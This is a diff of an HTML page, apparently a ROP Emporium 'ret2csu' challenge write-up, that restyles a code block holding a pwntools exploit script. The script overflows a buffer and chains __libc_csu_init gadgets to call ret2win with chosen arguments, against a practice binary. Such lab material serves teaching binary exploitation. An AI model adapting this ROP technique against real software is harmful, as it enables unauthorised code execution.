@@ -78,42 +78,27 @@
 <div>
     <img src="../imgs/rop_emporium/ret2csu4.png" alt="">
 </div>
-<div>
-    <style 
-        type="text/css">
-            pre code {
-                      background-color: #008080;
-                      border: 1px solid #999;
-                      display: block;
-                      padding: 15px;
-                      color:  #F5F5DC;
-                    }
-    </style>
-    <pre>
-        <code>
-#!/usr/bin/env python
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #586e75; font-style: italic">#!/usr/bin/env python</span>
 
-from pwn import *
-elf = context.binary = ELF('./ret2csu')
-libc = elf.libc
+<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
+<span style="color: #839496">elf</span> <span style="color: #586e75">=</span> <span style="color: #839496">context</span><span style="color: #586e75">.</span><span style="color: #839496">binary</span> <span style="color: #586e75">=</span> <span style="color: #839496">ELF(</span><span style="color: #2aa198">'./ret2csu'</span><span style="color: #839496">)</span>
+<span style="color: #839496">libc</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">libc</span>
 
-p = elf.process()
+<span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">process()</span>
 
-csu_pop = p64(0x40069a) #pop rbx,rbp,r12,r13,r14,r15; ret
-csu_mov = p64(0x400680) #mov rdx,r15; mov rsi,r14; mov edi,r13d; call r12+rbx*8
-pop_rdi = p64(0x4006a3)
-win = p64(elf.sym.ret2win)
-t = p64(0)
-init = p64(0x400398)    #address to _init pointer
+<span style="color: #839496">csu_pop</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x40069a</span><span style="color: #839496">)</span> <span style="color: #586e75; font-style: italic">#pop rbx,rbp,r12,r13,r14,r15; ret</span>
+<span style="color: #839496">csu_mov</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x400680</span><span style="color: #839496">)</span> <span style="color: #586e75; font-style: italic">#mov rdx,r15; mov rsi,r14; mov edi,r13d; call r12+rbx*8</span>
+<span style="color: #839496">pop_rdi</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x4006a3</span><span style="color: #839496">)</span>
+<span style="color: #839496">win</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(elf</span><span style="color: #586e75">.</span><span style="color: #839496">sym</span><span style="color: #586e75">.</span><span style="color: #839496">ret2win)</span>
+<span style="color: #839496">t</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0</span><span style="color: #839496">)</span>
+<span style="color: #839496">init</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x400398</span><span style="color: #839496">)</span>    <span style="color: #586e75; font-style: italic">#address to _init pointer</span>
 
-payload = b'A'*40 + csu_pop + t + p64(0x1) + init + t + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + csu_mov 
-payload += b'A'*8*7 + pop_rdi + p64(0xdeadbeefdeadbeef) + win
+<span style="color: #839496">payload</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">b'A'</span><span style="color: #586e75">*</span><span style="color: #2aa198">40</span> <span style="color: #586e75">+</span> <span style="color: #839496">csu_pop</span> <span style="color: #586e75">+</span> <span style="color: #839496">t</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x1</span><span style="color: #839496">)</span> <span style="color: #586e75">+</span> <span style="color: #839496">init</span> <span style="color: #586e75">+</span> <span style="color: #839496">t</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0xcafebabecafebabe</span><span style="color: #839496">)</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0xd00df00dd00df00d</span><span style="color: #839496">)</span> <span style="color: #586e75">+</span> <span style="color: #839496">csu_mov</span> 
+<span style="color: #839496">payload</span> <span style="color: #586e75">+=</span> <span style="color: #2aa198">b'A'</span><span style="color: #586e75">*</span><span style="color: #2aa198">8</span><span style="color: #586e75">*</span><span style="color: #2aa198">7</span> <span style="color: #586e75">+</span> <span style="color: #839496">pop_rdi</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0xdeadbeefdeadbeef</span><span style="color: #839496">)</span> <span style="color: #586e75">+</span> <span style="color: #839496">win</span>
 
-p.sendlineafter('> ', payload)
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendlineafter(</span><span style="color: #2aa198">'&gt; '</span><span style="color: #839496">,</span> <span style="color: #839496">payload)</span>
 
-p.interactive()
-        </code>
-    </pre>
-</div>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
+</pre></div>
 <br><br>
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
